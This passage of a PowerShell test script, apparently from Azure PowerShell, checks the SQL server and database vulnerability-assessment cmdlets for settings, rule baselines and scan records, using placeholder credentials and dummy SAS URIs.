














function Test-VulnerabilityAssessmentServerSettingsTest
{
	
	$testSuffix = getAssetName
	Create-VulnerabilityAssessmentTestEnvironment $testSuffix
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix

	$serverLogin = "testusername"
	
	$serverPassword = "t357ingP@s5w0rd!Sec"
	$credentials = new-object System.Management.Automation.PSCredential($serverLogin, ($serverPassword | ConvertTo-SecureString -asPlainText -Force))
	$location = "West Central US"
	$serverVersion = "12.0"

	try
	{
		
		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $params.serverName -DoNotConfigureVulnerabilityAssessment

		Assert-ThrowsContains -script { Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		 -StorageAccountName $params.storageAccount -EmailAdmins $true -NotificationEmail @("invalidMail") -RecurringScansInterval Weekly } `
		 -message "One or more of the email addresses you entered are not valid.."

		Assert-ThrowsContains -script { Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		 -BlobStorageSasUri "https://invalid.blob.core.windows.netXXXXXXXXXXXXXXX"} `
		 -message "Invalid BlobStorageSasUri parameter value. The value should be in format of https://mystorage.blob.core.windows.net/vulnerability-assessment?st=XXXXXX."

		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
			 -StorageAccountName $params.storageAccount

		
		$settings = Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName 
		
		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerName
		Assert-AreEqual $params.storageAccount $settings.StorageAccountName	
		Assert-AreEqual None $settings.RecurringScansInterval
		Assert-AreEqual $true $settings.EmailAdmins
		Assert-AreEqualArray @() $settings.NotificationEmail

		
		$testEmailAdmins = $true
		$testNotificationEmail = @("test1@mailTest.com", "test2@mailTest.com")
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::Weekly

		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
			  -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `
			  -NotificationEmail $testNotificationEmail

		
		$settings = Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName 

		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerName
		Assert-AreEqual $params.storageAccount $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-AreEqualArray $testNotificationEmail $settings.NotificationEmail

		
		Clear-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName

		
		$settings = Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName

		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual "" $settings.ScanResultsContainerName
		Assert-AreEqual "" $settings.StorageAccountName	
		Assert-AreEqual None $settings.RecurringScansInterval
		Assert-AreEqual $true $settings.EmailAdmins
		Assert-Null $settings.NotificationEmail

		
		$testScanResultsContainerName = "custom-container"
		$testStorageName = "storage1"
		$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::None

		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		 -BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `
		 -NotificationEmail $testNotificationEmail
		
		
		$newServerName = "newServerName" +$testSuffix;
		$testNewNotificationEmail = @("test3@mailTest.com", "test4@mailTest.com")
		$testStorageName = $params.storageAccount
		$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::None

		New-AzSqlServer -ResourceGroupName $params.rgname -ServerName $newServerName -Location $location -ServerVersion $serverVersion -SqlAdministratorCredentials $credentials

		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $newServerName -DoNotConfigureVulnerabilityAssessment

		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $newServerName `
		 -BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `
		 -NotificationEmail $testNewNotificationEmail

    	Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $newServerName | Update-AzSqlServerVulnerabilityAssessmentSetting `
			 -ResourceGroupName $params.rgname -ServerName $params.serverName
		$settings = Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName 

		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerName
		Assert-AreEqual $testStorageName $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail

		
		$settings = Get-AzSqlServer -ResourceGroupName $params.rgname -ServerName $params.serverName | Get-AzSqlServerVulnerabilityAssessmentSetting 
		 
		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerName
		Assert-AreEqual $testStorageName $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail

		
		$settings = Get-AzSqlServer -ResourceGroupName $params.rgname -ServerName $params.serverName | Clear-AzSqlServerVulnerabilityAssessmentSetting 
		 
		
		Assert-Null $settings

		
		$testEmailAdmins = $false
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::Weekly
		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
			  -StorageAccountName $params.storageAccount -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins

		
		$settings = Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName 
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $params.storageAccount $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-Null $settings.NotificationEmail

		
		Clear-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName

		
		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		  -StorageAccountName $params.storageAccount -WhatIf
		
		
		$settings = Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName

		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual "" $settings.ScanResultsContainerName
		Assert-AreEqual "" $settings.StorageAccountName	
		Assert-AreEqual None $settings.RecurringScansInterval
		Assert-AreEqual $true $settings.EmailAdmins
		Assert-Null $settings.NotificationEmail

		
		Update-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		 -BlobStorageSasUri $testBlobStorageSasUri

		Clear-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-WhatIf
		
		
		Get-AzSqlServerVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName
	}
	finally
	{
		
		Remove-VulnerabilityAssessmentTestEnvironment $testSuffix
	}
}


function Test-VulnerabilityAssessmentWithSettingsNotDefinedTest
{
	
	$testSuffix = getAssetName
	Create-VulnerabilityAssessmentTestEnvironment $testSuffix
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix

	try
	{
		$ruleId = "VA2031"
		$scanId = "myCustomScanId"
		$baselineResults = @(@("userA", "SELECT"),@("userB", "SELECT"))
		
		
		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $params.serverName -DoNotConfigureVulnerabilityAssessment

		
		Assert-Throws { Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId -BaselineResult $baselineResults }

		Assert-Throws { Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId }

		Assert-Throws { Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId }

		
		Assert-Throws { Convert-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -ScanId $scanId }

		Assert-Throws { Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -ScanId $scanId }

		Assert-Throws { Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -ScanId $scanId }
	}
	finally
	{
		
		Remove-VulnerabilityAssessmentTestEnvironment $testSuffix
	}
}


function Test-VulnerabilityAssessmentSettingsTest
{
	
	$testSuffix = getAssetName
	Create-VulnerabilityAssessmentTestEnvironment $testSuffix
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix

	try
	{
		
		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $params.serverName -DoNotConfigureVulnerabilityAssessment

		Assert-ThrowsContains -script { Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		 -StorageAccountName $params.storageAccount -EmailAdmins $true -NotificationEmail @("invalidMail") -RecurringScansInterval Weekly } `
		 -message "One or more of the email addresses you entered are not valid.."

		Assert-ThrowsContains -script { Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		 -BlobStorageSasUri "https://invalid.blob.core.windows.netXXXXXXXXXXXXXXX"} `
		 -message "Invalid BlobStorageSasUri parameter value. The value should be in format of https://mystorage.blob.core.windows.net/vulnerability-assessment?st=XXXXXX."

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
			 -StorageAccountName $params.storageAccount

		
		$settings = Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 
		
		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $params.databaseName $settings.DatabaseName
		Assert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerName
		Assert-AreEqual $params.storageAccount $settings.StorageAccountName	
		Assert-AreEqual None $settings.RecurringScansInterval
		Assert-AreEqual $true $settings.EmailAdmins
		Assert-AreEqualArray @() $settings.NotificationEmail

		
		$testEmailAdmins = $true
		$testNotificationEmail = @("test1@mailTest.com", "test2@mailTest.com")
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::Weekly

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
			  -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `
			  -NotificationEmail $testNotificationEmail

		
		$settings = Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 

		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $params.databaseName $settings.DatabaseName
		Assert-AreEqual "vulnerability-assessment" $settings.ScanResultsContainerName
		Assert-AreEqual $params.storageAccount $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-AreEqualArray $testNotificationEmail $settings.NotificationEmail

		
		Clear-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		
		$settings = Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual "" $settings.ScanResultsContainerName
		Assert-AreEqual "" $settings.StorageAccountName	
		Assert-AreEqual None $settings.RecurringScansInterval
		Assert-AreEqual $true $settings.EmailAdmins
		Assert-Null $settings.NotificationEmail

		
		$testScanResultsContainerName = "custom-container"
		$testStorageName = "storage1"
		$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::None

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		 -BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `
		 -NotificationEmail $testNotificationEmail
		
		
		$newDatabaseName = "newDatabaseName";
		$testNewNotificationEmail = @("test3@mailTest.com", "test4@mailTest.com")
		$testStorageName = $params.storageAccount
		$testBlobStorageSasUri = "https://" + $testStorageName +".blob.core.windows.net/" + $testScanResultsContainerName + "?st=XXXXXXXXXXXXXXX"
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::None

		New-AzSqlDatabase -DatabaseName $newDatabaseName -ResourceGroupName $params.rgname -ServerName $params.serverName -Edition Basic 

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $newDatabaseName `
		 -BlobStorageSasUri $testBlobStorageSasUri -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins `
		 -NotificationEmail $testNewNotificationEmail

    	Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $newDatabaseName | Update-AzSqlDatabaseVulnerabilityAssessmentSetting `
			 -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$settings = Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 

		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $params.databaseName $settings.DatabaseName
		Assert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerName
		Assert-AreEqual $testStorageName $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail

		
		$settings = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseVulnerabilityAssessmentSetting 
		 
		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $params.databaseName $settings.DatabaseName
		Assert-AreEqual $testScanResultsContainerName $settings.ScanResultsContainerName
		Assert-AreEqual $testStorageName $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-AreEqualArray $testNewNotificationEmail $settings.NotificationEmail

		
		$settings = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Clear-AzSqlDatabaseVulnerabilityAssessmentSetting 
		 
		
		Assert-Null $settings

		
		$testEmailAdmins = $false
		$testRecurringScansInterval = [Microsoft.Azure.Commands.Sql.VulnerabilityAssessment.Model.RecurringScansInterval]::Weekly
		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
			  -StorageAccountName $params.storageAccount -RecurringScansInterval $testRecurringScansInterval -EmailAdmins $testEmailAdmins

		
		$settings = Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual $params.databaseName $settings.DatabaseName
		Assert-AreEqual $params.storageAccount $settings.StorageAccountName	
		Assert-AreEqual $testRecurringScansInterval $settings.RecurringScansInterval
		Assert-AreEqual $testEmailAdmins $settings.EmailAdmins
		Assert-Null $settings.NotificationEmail

		
		Clear-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		
		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		  -StorageAccountName $params.storageAccount -WhatIf
		
		
		$settings = Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName

		
		Assert-AreEqual $params.rgname $settings.ResourceGroupName
		Assert-AreEqual $params.serverName $settings.ServerName
		Assert-AreEqual "" $settings.ScanResultsContainerName
		Assert-AreEqual "" $settings.StorageAccountName	
		Assert-AreEqual None $settings.RecurringScansInterval
		Assert-AreEqual $true $settings.EmailAdmins
		Assert-Null $settings.NotificationEmail

		
		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		 -BlobStorageSasUri $testBlobStorageSasUri

		Clear-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-WhatIf
		
		
		Get-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName
	}
	finally
	{
		
		Remove-VulnerabilityAssessmentTestEnvironment $testSuffix
	}
}


function Test-VulnerabilityAssessmentBaselineTest
{
	
	$testSuffix = getAssetName
	Create-VulnerabilityAssessmentTestEnvironment $testSuffix
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix

	try
	{
		
		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $params.serverName -DoNotConfigureVulnerabilityAssessment

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
			 -StorageAccountName $params.storageAccount

		$ruleId = "VA2108"

		
		$baselineDoesntExistsErrorMessage = "Baseline does not exist for rule 'VA2108'."
		Assert-ThrowsContains -script { Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessage

		Assert-ThrowsContains -script { Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessage

		
		$baselineToSet = @( 'Principal1', 'db_ddladmin', 'SQL_USER', 'None'), @( 'Principal2', 'db_ddladmin', 'SQL_USER', 'None')
		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -BaselineResult $baselineToSet
		
		
		$baseline = Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId

		Assert-AreEqual $params.rgname $baseline.ResourceGroupName
		Assert-AreEqual $params.serverName $baseline.ServerName
		Assert-AreEqual $params.databaseName $baseline.DatabaseName
		Assert-AreEqual $ruleId $baseline.RuleId
		Assert-AreEqual $false $baseline.RuleAppliesToMaster
		Assert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].Result
		Assert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].Result

		
		$baselineToSet = @( 'Principal3', 'db_ddladmin', 'SQL_USER', 'None'), @( 'Principal4', 'db_ddladmin', 'SQL_USER', 'None')
		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -BaselineResult $baselineToSet
		
		
		$baseline = Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId

		Assert-AreEqual $params.rgname $baseline.ResourceGroupName
		Assert-AreEqual $params.serverName $baseline.ServerName
		Assert-AreEqual $params.databaseName $baseline.DatabaseName
		Assert-AreEqual $ruleId $baseline.RuleId
		Assert-AreEqual $false $baseline.RuleAppliesToMaster
		Assert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].Result
		Assert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].Result

		
		Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId

		
		Assert-ThrowsContains -script { Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessage

		Assert-ThrowsContains -script { Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessage

		
		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -BaselineResult $baselineToSet

		
		Assert-ThrowsContains -script { Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId -RuleAppliesToMaster } -message $baselineDoesntExistsErrorMessage

		Assert-ThrowsContains -script { Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId -RuleAppliesToMaster} -message $baselineDoesntExistsErrorMessage

		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -RuleAppliesToMaster -BaselineResult $baselineToSet

		$baseline = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName`
		| Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -RuleId $ruleId -RuleAppliesToMaster
		Assert-AreEqual $params.rgname $baseline.ResourceGroupName
		Assert-AreEqual $params.serverName $baseline.ServerName
		Assert-AreEqual $params.databaseName $baseline.DatabaseName
		Assert-AreEqual $ruleId $baseline.RuleId
		Assert-AreEqual $true $baseline.RuleAppliesToMaster
		Assert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].Result
		Assert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].Result

		Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -RuleAppliesToMaster

		
		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -BaselineResult $baselineToSet
		
		Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId | Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline

		$baseline = Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline `
		-RuleId $ruleId
		Assert-AreEqual $params.rgname $baseline.ResourceGroupName
		Assert-AreEqual $params.serverName $baseline.ServerName
		Assert-AreEqual $params.databaseName $baseline.DatabaseName
		Assert-AreEqual $ruleId $baseline.RuleId
		Assert-AreEqual $false $baseline.RuleAppliesToMaster
		Assert-AreEqualArray $baselineToSet[0] $baseline.BaselineResult[0].Result
		Assert-AreEqualArray $baselineToSet[1] $baseline.BaselineResult[1].Result

		Get-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName | Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline `
		-RuleId $ruleId
		Assert-ThrowsContains -script { Get-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId } -message $baselineDoesntExistsErrorMessage

		
		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -BaselineResult $baselineToSet -WhatIf
		
		
		Assert-ThrowsContains -script { Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId } -message $baselineDoesntExistsErrorMessage

		
		Set-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId -BaselineResult $baselineToSet

		Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName `
		-DatabaseName $params.databaseName -RuleId $ruleId -WhatIf
		
		
		Clear-AzSqlDatabaseVulnerabilityAssessmentRuleBaseline -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
		-RuleId $ruleId
	}
	finally
	{
		
		Remove-VulnerabilityAssessmentTestEnvironment $testSuffix
	}
}


function Test-VulnerabilityAssessmentScanRecordGetListTest
{
	
	$testSuffix = getAssetName
	Create-VulnerabilityAssessmentTestEnvironment $testSuffix
	$params = Get-SqlVulnerabilityAssessmentTestEnvironmentParameters $testSuffix

	try
	{
		
		Enable-AzSqlServerAdvancedThreatProtection -ResourceGroupName $params.rgname -ServerName $params.serverName -DoNotConfigureVulnerabilityAssessment

		Update-AzSqlDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName `
			 -StorageAccountName $params.storageAccount
	
		
		try
		{
			Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName 
		}
		catch
		{
			if ((Get-SqlTestMode) -eq 'Playback')
			{
				
				
			}
			else
			{
				throw;
			}
		}

		
		$scanId1 = "cmdletGetListScan"
		$scanJob = Start-AzSqlDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId1 -AsJob
		$scanJob | Wait-Job
		$scanRecord1 = $scanJob | Receive-Job

		
		Assert-AreEqual $params.rgname $scanRecord1.ResourceGroupName
		Assert-AreEqual $params.serverName $scanRecord1.ServerName 
		Assert-AreEqual $params.databaseName $scanRecord1.DatabaseName 
		Assert-AreEqual $scanId1 $scanRecord1.ScanId
		Assert-AreEqual "OnDemand" $scanRecord1.TriggerType

		
		$scanRecord1FromGet = Get-AzSqlDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -ServerName $params.serverName `
